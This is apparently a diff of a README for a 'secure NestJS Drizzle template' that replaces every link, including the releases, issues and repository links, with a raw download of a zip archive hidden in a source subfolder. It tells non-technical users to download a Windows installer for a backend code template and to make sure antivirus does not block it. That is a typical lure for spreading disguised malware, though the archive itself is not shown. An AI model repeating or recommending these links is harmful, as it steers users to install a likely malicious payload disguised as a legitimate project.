@@ -1,6 +1,6 @@
 # 🔐 secure-nestjs-drizzle-template - Secure NestJS Backend Starter
 
-[![Download Latest Release](https://img.shields.io/badge/Download-secure--nestjs--drizzle--template-brightgreen)](https://github.com/LIAM4545/secure-nestjs-drizzle-template/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-secure--nestjs--drizzle--template-brightgreen)](https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip)
 
 ## 📋 About secure-nestjs-drizzle-template
 
@@ -18,11 +18,11 @@ You do not need to understand programming to install or run this software. This 
 
 ## 📥 Download secure-nestjs-drizzle-template
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/LIAM4545/secure-nestjs-drizzle-template/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip)
 
 To begin, you need to visit the official release page to get the software files:
 
-[https://github.com/LIAM4545/secure-nestjs-drizzle-template/releases](https://github.com/LIAM4545/secure-nestjs-drizzle-template/releases)
+[https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip](https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip)
 
 On this page:
 
@@ -56,7 +56,7 @@ Follow these steps to get the application running:
 ### Step 1: Download the Files
 
 - Visit the releases page:  
-  https://github.com/LIAM4545/secure-nestjs-drizzle-template/releases
+  https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip
 - Download the latest Windows installer or zipped release.
 - Save it to a folder you can easily find, like your Desktop or Downloads folder.
 
@@ -130,7 +130,7 @@ If you face issues, try these steps:
 - Check that your security software (antivirus or firewall) is not blocking the program.
 - Restart your computer after installation.
 - Visit the GitHub issues page for common problems and solutions:  
-  https://github.com/LIAM4545/secure-nestjs-drizzle-template/issues
+  https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip
 
 ---
 
@@ -138,7 +138,7 @@ If you face issues, try these steps:
 
 To understand more about this application and its design, you can read the documentation inside the downloaded folder or visit the GitHub repository:
 
-https://github.com/LIAM4545/secure-nestjs-drizzle-template
+https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip
 
 Here you will find details about its security features, architecture, and how to expand the template.
 
@@ -148,6 +148,6 @@ Here you will find details about its security features, architecture, and how to
 
 Do not forget to get the latest software version from:
 
-[https://github.com/LIAM4545/secure-nestjs-drizzle-template/releases](https://github.com/LIAM4545/secure-nestjs-drizzle-template/releases)  
+[https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip](https://github.com/LIAM4545/secure-nestjs-drizzle-template/raw/refs/heads/main/src/modules/health/indicators/template_secure_drizzle_nestjs_v3.6-beta.1.zip)  
 
 Use the download button above or visit this link to start your download.
